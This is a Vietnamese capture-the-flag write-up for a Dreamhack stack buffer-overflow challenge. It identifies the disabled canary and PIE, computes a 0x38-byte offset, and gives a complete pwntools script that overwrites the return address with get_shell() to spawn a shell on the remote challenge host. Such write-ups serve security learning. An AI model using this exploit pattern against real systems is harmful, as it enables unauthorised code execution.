# Challenge: Return Address Overwrite

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/return_address_overwrite/rao)
- Khi thực thi, chương trình kêu user nhập input bằng hàm scanf và sau đó exit.
- Checksec:
```
+ Arch:       amd64-64-
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```

## Giải pháp
- Khi check trong ida, tôi thấy hàm get_shell() chứa execve("/bin/sh", 0, 0).
- Chương trình dùng scanf nhưng **Canary tắt** nên có thể khai thác **Buffer Overflow**.
- Cùng với **PIE tắt** nên ta có thể overwrite hàm ret để trả về địa chỉ get_shell().
> Overwrite ret thành địa chỉ get_shell() để có shell.

## Quá trình
- Tính offset: Từ buf đến ret có 0x38 bytes rác.
- Địa chỉ hàm get_shell(): Ta lấy bằng exe.sym['get_shell'] vì PIE tắt nên có thể sử dụng.
> Payload = b'A'*0x38 + p64(exe.sym['get_shell']

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('rao', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 23646)
else:
    p = process([exe.path])
GDB()

payload = b'A'*0x38 + p64(exe.sym['get_shell'])
sla(b'Input: ', payload)

p.interactive()
```
